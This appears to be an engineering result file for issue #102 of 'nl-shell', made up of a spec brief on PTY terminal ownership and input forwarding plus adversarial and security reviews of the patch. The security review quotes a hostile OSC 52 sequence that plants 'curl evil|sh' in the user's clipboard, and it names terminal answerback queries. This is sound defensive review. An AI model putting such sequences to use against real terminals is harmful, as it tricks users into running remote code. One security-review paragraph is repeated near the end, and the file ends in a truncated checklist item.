# Result — issue 102 / session-terminal-ownership

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: While a command runs, child-1's session does not own the user's real terminal, so interactive programs, keyboard Ctrl-C and window resizes don't work and keys typed during a command have no defined fate. Implement spec `pty-protocol/v1` §6 on top of child-1's session, with the real terminal injectable (its fds) so tests can use an `os.openpty()` pair: between sending a command and its `D` record, put the real terminal in raw mode and forward every input byte to the PTY master unchanged, never logging, capturing or keeping a forwarded byte (§6.1); copy PTY output to the real terminal and capture it except on the alternate screen — capture stops on `ESC [?1049h` / `ESC [?47h` / `ESC [?1047h` and resumes only on the matching reset (§6.2 lists only `?1049`/`?47`; `?1047` is the third xterm alternate-screen mode and the strict pairing is this brief's reading of "the matching reset" — update §6.2 wording to name all three and the pairing); on `SIGWINCH` copy the real terminal's size to the PTY (§6.3); control keys travel as bytes (§6.4); restore the real terminal's mode on every exit path (§6.5). Forwarding window: spec §6.1 governs — from when the paste is sent to the `D` record (ADR-0014 Decision 4's "from the start record" is the looser summary; the spec's window is the wider one and closes the paste→`S` gap). Decisions (parent brief `results/issue_10/brief.md:52-56`, human 2026-10-15): (6) typed-ahead input never joins the next confirmed command — forwarding stops at the `D` record, and input forwarded during the command that nobody consumed is discarded before bash reads its next line. **Mechanism (chosen here):** nl-shell's prompt hook, after it writes `D` and the snapshot records and as its LAST step before writing `E`, drains bash's stdin with builtins only: a loop of `builtin read -r -s -N 4096 -t 0.05` that ends at the first read returning nothing within 50 ms (`read -N` reads in non-canonical mode, so a partial line with no Enter is drained too; `builtin` so a user function named `read` from `~/.bashrc` cannot replace it). It must sit before `E`, not after: nl-shell may write the next paste as soon as it reads `E`, and a drain after `E` would eat it. nl-shell side: the forwarder watches fd 3 together with real-terminal input, checks fd 3 before every write to the session master, writes in chunks of at most 1 KB, and stops forwarding the moment it reads `D`. §5.1's send sequence is unchanged and the mechanism is the same in emacs and vi mode. **Residual race (not a guarantee):** a byte forwarded after bash wrote `D` but before nl-shell read it, that lands after the drain's final 50 ms quiet window, reaches readline and is prepended to the next paste. It needs nl-shell to lag more than the snapshot time plus 50 ms in reading `D`. This brief does not close it; spec §6.1 and the threat model Known gaps must name it, and the human decides at sign-off whether it is acceptable for v1 (see NEEDS-HUMAN note at the end). The exact fix (Option A) is a back-channel: the hook blocks on a second pipe (fd 4) until nl-shell acks "forwarding stopped", then drains. It is not taken here because it changes the start-up command (`v1.md:165`, versioning) and adds an fd confirmed code can close or read; it is the follow-up if the human rejects the race. Interaction with #141: `H` holds nl-shell's hook functions' `declare -p` text compared against the session's OWN baseline, so the drain in the hook body is part of the baseline and does not trigger the tamper check; `read` is in #141's `HOOK_BUILTINS`, so `enable -n read` degrades the session (that is the accepted outcome for a disabled drain). Rejected: sending readline kill keys before the paste (vi mode needs `ESC`, which §5.2 bans, and it changes §5.1); `tcflush` from the master side (not shown to reach the slave's pending input). Unforwarded bytes still queued in nl-shell at `D` are dropped, never kept (§6.1); (7) capture stops at the first forwarded byte for the rest of that command, and the result carries a flag saying so.
- Success criterion: `python3 -m pytest tests/test_session.py tests/test_session_terminal.py` passes on the host (`tests/test_session.py` is #140/#141's suite, unchanged, so the drain's 50 ms per prompt breaks none of their timeouts) (real bash, an `os.openpty()` pair as the stand-in real terminal, every wait bounded by a timeout, sessions closed in teardown) and covers: (a) vector 11 driven with `printf` (no `less` dependency): output between `ESC [?1049h` and `ESC [?1049l` (and `ESC [?47h`/`l`) and between `ESC [?1047h` and `ESC [?1047l`, is mirrored to the stand-in terminal but not captured, capture resumes after the matching reset, and a mismatched reset (`?1049h` closed by `?47l`) does not resume capture. (b) vector 10 via forwarding: `sleep 5`, then `\x03` written to the stand-in terminal → `D` with status 130 < 2 s later, session not degraded. (c) a sentinel byte string typed while `cat > /dev/null` runs reaches the program but appears nowhere in: the captured output, the result, any attribute of the session object AND of every `nl_shell.session_terminal` object the run created (forwarder, terminal wrapper — scan `vars()` recursively, including closures' cell contents), the module globals of `nl_shell.session` and `nl_shell.session_terminal`, and every log record emitted during the run (capture at DEBUG on the root logger with `caplog`). Also: a byte written to the stand-in terminal BEFORE the run method is called is not forwarded (start of the window). (d) decision 6, in both default (emacs) and `set -o vi` modes: during `sleep 2`, write `echo INJECTED; ` (no Enter) to the stand-in terminal → the next confirmed `true` has empty output and status 0; and a 200 KB typed-ahead burst does not change the next command's status. Also: with no terminal attached, `true` returns within 0.5 s (the drain adds ~50 ms per prompt, not more). (d) depends on the residual race above not firing; re-run a red (d) once before reading it as a regression. The test writes the burst from a separate thread (the stand-in master can fill); the forwarder writes to the session master non-blocking and keeps reading PTY output and fd 3 while input is pending, so a full tty input buffer never stalls `D` detection — the run returns within its timeout, it does not deadlock. (e) decision 7: after the first forwarded byte the result's flag is set and later output is not captured. (f) run `sleep 1; stty size` with the stand-in terminal at 24×80; about 0.3 s in (inside the §6 window), a helper thread resizes the stand-in terminal to 40×100 and sends `SIGWINCH` to the test process → the output is `40 100`. The run method runs on the main thread (Python delivers signal handlers there); the previous `SIGWINCH` handler is restored after the run. (g) the stand-in terminal's termios attributes are equal before and after a normal run, a run that ends in degraded mode, and a run interrupted by an exception raised mid-command. Threat model §How to exercise it mentions the terminal tests and Known gaps names the residual drain race; spec §6.1 states the discard and the residual race, §6.2 names `?1047` and the matching-reset pairing, and ADR-0014 Decision 4 says the window runs from sending the command to the done record.

### Advisory — adversary

# Adversarial review — #102 session-terminal-ownership

Tooling: pytest is not installed in this sandbox, so I could not re-run the suite as-is. Real bash 5.3 and `ptyprocess` are present, so I drove the patched `Session.run(…, terminal=Terminal(fd))` directly with standalone scripts (an `os.openpty()` pair as the user's terminal, scratch `HOME`). I took the red→green evidence from the frozen logs: `gate-logs/C4-verify.log` shows 15/15 failing before the fix and 15/15 passing after; `gate-logs/T3-suite.log` shows 496 passed; `tests/test_session.py` has no diff.

## Findings

- NEEDS-HUMAN [human] — `src/nl_shell/session_terminal.py:46-49`: the alternate-screen check only matches the three sequences as single parameters, so a multi-parameter DECSET (a "set private mode" sequence that sets several modes at once, which xterm accepts) gets past it and the alternate-screen output is captured. Reproduced: `printf 'A\n\033[?1049;25hSECRET1\033[?1049;25lB\n'; printf '\033[?25;1049hSECRET2\033[?25;1049lC\n'` returned `result.text` with `SECRET1` and `SECRET2` in it. This does follow the letter of the new §6.2 text (`docs/design/specs/pty-protocol/v1.md` §6.2 names the literal sequences), so the gap is in the spec as much as in the code. A human should decide whether §6.2 means "mode 1049/47/1047 set by any `CSI ? Pm h`" (then the regex should parse the parameter list, and probably 8-bit CSI `\x9b` too) or only the literal forms. It is rare in practice (most TUIs send `\x1b[?1049h` on its own), but it is a concrete capture leak.

- C4 red leg is weaker evidence than it looks: `tests/test_session_terminal.py` imports the new module inside each test, so all 15 reds are `ModuleNotFoundError`. That proves the tests depend on the module. It does not prove each test catches its own defect. I checked the one that matters most, decision 6 (`tests/test_session_terminal.py:359`), by removing the drain from `RCFILE` (`src/nl_shell/session.py:258-262`) and replaying its scenario. Without the drain the next `true` returned `'INJECTED\n'`; with it, `''`. So that test really checks the drain. I did not do the same mutation check for the other 14 tests. Not a refutation.

## Attempted refutations that failed (the fix held)

- Ctrl-C mashed across the command's end (`\x03` every 2 ms from 0.1 s to 0.7 s around `sleep 0.3`, 5 trials): I wanted a `\x03` to land in the prompt hook or drain (`src/nl_shell/session.py:258-262`), abort it before `E`, and degrade the session. Every trial gave status 130, no degrade, and the next `echo ok` was clean.
- Typed-ahead edge cases during `sleep 2`, each followed by `true`: a lone Ctrl-D (`\x04`), `\x04\x04\x04`, `abc\x04`, 5000 NUL bytes followed by `echo INJECTED; ` (to make `read -N` return a chunk that is all NULs and end the drain loop early), and a full line `echo INJECTED\r`. In every case the next result was `''` with status 0, no degrade, and bash did not exit.
- Window size at the start of a run (`_copy_size` in `begin()`, `session_terminal.py:150`) with the terminal at 40×100, 50×132 and 24×80: `stty size` reported the right size each time, and readline's redraw did not upset output delimiting.
- Ctrl-Z during `sleep 2`: status 148, session not degraded.
- A command that reads its input late (`sleep 0.6; read -t 1 x`) with `abc\r` typed at 0.3 s: the input reached the program (`input_forwarded=True`), and its output was not captured, as decision 7 says.
- The paste sent after `begin()` sets the master non-blocking (`session_terminal.py:146`): `_write_all` (`session.py:1229-1237`) handles `BlockingIOError`, so a long paste is not cut short.
- The `_marker_start` change (`session.py:1178`) also changes `_Output` when no terminal is passed; T3 (496 passed) and the unchanged `tests/test_session.py` show no regression.

## Reviewer-verdict notes

- The residual drain race (a byte forwarded after bash writes `D` but before nl-shell reads it) is real and only documented, not closed. The brief already routes the decision to accept it to the human at sign-off, so I am not filing a separate item. My probes did not trigger it.

I found no other concrete failing case in the diff.

### Advisory — security-review

# Security review — session-terminal-ownership (#102)

**Attacker-reachable inputs this diff touches:** command output (threat model entry 1). It now flows through `_Ownership.mirror()` to the real terminal and through `_AltScreen.filter()` into the capture. It also controls the alternate-screen state. Typed input on the real terminal comes from the user, which the threat model trusts. The new drain in the prompt hook (`session.py:257-262`) runs inside the session, and the session state is entry 4. No product code calls `run(terminal=…)` yet (no caller in `src/`; REPL wiring is #78), so everything below can be reached only from the tests today.

## Findings

- NEEDS-HUMAN [impl] — **High once wired (output writes the clipboard); latent today.** `src/nl_shell/session_terminal.py:235-248` (`mirror`), called from `src/nl_shell/session.py:457` (`_Output._append`). The input is command output, which the text-only attacker controls. `mirror()` copies it to the real terminal byte for byte, with no rendering filter. A command like `printf '\033]52;c;%s\a' "$(printf 'curl evil|sh' | base64)"` writes the user's clipboard. Terminal query sequences such as `\033[6n` or `\033[21t` make the real terminal type a reply on its own input. During the §6 window that reply is forwarded to the command. After `D` it stays queued in the real terminal for whatever reads next (prompt_toolkit, once #78 lands). The brief rightly puts the filter out of scope, and the patch doesn't wire the mirror to any user. But `threat_model.md:132` ("What must hold") says the mirrored PTY output is filtered, and the patch adds no Known-gaps line saying the new mirror path is unfiltered. It also doesn't add the filter issue to the "#78 MUST NOT wire" list (`threat_model.md:222`). The fix is doc-only: add one Known-gaps bullet ("§6 mirror is unfiltered; OSC 52 and terminal answerbacks pass through until the rendering-filter issue lands") and name that issue in the #78 gate line. You can check it with a test that runs `printf '\033]52;c;QQ==\a'` with a stand-in terminal and finds the sequence in what the stand-in master reads. It passes today, and that is the gap.

- NEEDS-HUMAN [human] — **Residual drain race. Its rating depends on who wrote the byte.** `src/nl_shell/session.py:257-262` (the drain) and `src/nl_shell/session.py:764` (`forwarding_over`). If it fires, a forwarded byte is put in front of the next bracketed paste, so the next command differs from the confirmed one. That is the Critical row on the scale if the byte came from an attacker. I checked whether command output can widen the race. It can't in practice. `forwarding_over()` reads fd 3 right before each `os.write` to the master (`session_terminal.py:214-218`), with no I/O between the check and the write. So making nl-shell slow, for example with heavy output or a slow terminal, doesn't widen the window. The only attacker path is a terminal answerback (see the item above) that lands in that few-microsecond gap, followed by a scheduler stall of at least the snapshot time plus 50 ms. The brief already asks the human to accept this race or ask for Option A (a second pipe on which nl-shell tells the hook that forwarding stopped). One more point for that decision: the race is in Known gaps (`threat_model.md:212`) but not in the "#78 MUST NOT wire" list (`threat_model.md:222`). Decide whether it belongs there.

## Checked, no finding

- **Forwarded bytes kept nowhere (§6.1).** `forwarded` is set right after a successful write (`session_terminal.py:224-226`), before any echo can be read back, so the echo is never captured (`capture`/`flush`, `:250-259`). `_drop_pending` zeroes the buffer. `session.py` has no logging calls on this path. Test (c) scans objects, closures, module globals and DEBUG log records.
- **Start of the window.** `tcflush(TCIFLUSH)` runs in `begin()` (`session_terminal.py:144`) before the paste, so bytes typed earlier never reach bash. A test covers this.
- **Paste integrity with the master non-blocking.** `begin()` makes the master non-blocking before the paste is written (`session.py:720`), but `_write_all` (`session.py:1229-1237`) retries on `BlockingIOError`, so a large paste is still written whole. §5.1 is unchanged.
- **The drain can't be hijacked by session state.** It uses `\builtin read` (immune to aliases and functions), and `-N` ignores `IFS`. `enable -n read` degrades the session, because `read` was added to `HOOK_BUILTINS` (`session.py:96`) and to the spec rcfile list. A function named `builtin` is an existing Known gap. Only nl-shell writes to the slave's input queue (legacy TIOCSTI is off, and code already running as the user is out of scope), so command output can't keep the drain looping past the prompt rule's 1 s limit.
- **Alternate-screen tracking from attacker output.** The strict pairing lets output turn capture off (`ESC[?1047h … ESC[?47l`). The effect is that less untrusted text reaches the state block. Output never ends up captured without being shown, so no threat-model property breaks. Multi-parameter forms (`ESC[?25;1049h`) are not recognised, so alt-screen text can end up in the capture. That text is untrusted command output either way and is labelled the same, so it's a capture-quality issue, not a security one. The tests use attacker-shaped `printf` output, including a mismatched reset (`tests/test_session_terminal.py:174-192`).
- **Terminal restore (§6.5).** `end()` runs in a `finally` (`session.py:716-725`) and restores the termios settings, the master's blocking flag and the `SIGWINCH` handler, even if one of those steps fails. Raw mode turns off ISIG on the real terminal, so a keyboard Ctrl-C can't raise `KeyboardInterrupt` part-way through. Tests cover normal, degraded and exception exits.
- **Gates.** C4 is red without the fix (15 of 15 tests fail) and green with it. T3 passes the full suite (496 tests). T2 confirms the threat model was touched.

It can't in practice. `forwarding_over()` reads fd 3 right before each `os.write` to the master (`session_terminal.py:214-218`), with no I/O between the check and the write. So making nl-shell slow, for example with heavy output or a slow terminal, doesn't widen the window. The only attacker path is a terminal answerback (see the item above) that lands in that few-microsecond gap, followed by a scheduler stall of at least the snapshot time plus 50 ms. The brief already asks the human to accept this race or ask for Option A (a second pipe on which nl-shell tells the hook that forwarding stopped). One more point for that decision: the race is in Known gaps (`threat_model.md:212`) but not in the "#78 MUST NOT wire" list (`threat_model.md:222`). Decide whether it belongs there.
- [ ] **The decision-6 drain rests on a race the brief calls a guarantee.** The brief says: "Because nl-shell forwards nothing after `D`, nothing new can arrive between the drain and readline starting." But bash writes `D` to fd 3 (`docs/design/specs/pty-protocol/v1.md:63`) and then starts draining at once. nl-shell only stops forwarding after it has *read and parsed* `D`. So the gap is bash's write → nl-shell's read, which takes time, and while that runs the forwarder can still write bytes to the session master. Any such byte that lands after the drain's "short" `-t` timeout runs out goes to readline. The next bracketed paste is then appended to it. Two problems follow. (1) Test (d) depends on timing, so it can be flaky under CI load, especially with the 200 KB burst still being forwarded when `D` arrives. (2) If it happens, the command that runs differs from the one the user confirmed. That is **Critical** in `.oss-scanner/threat_model.md:199`. The brief needs one of two things.
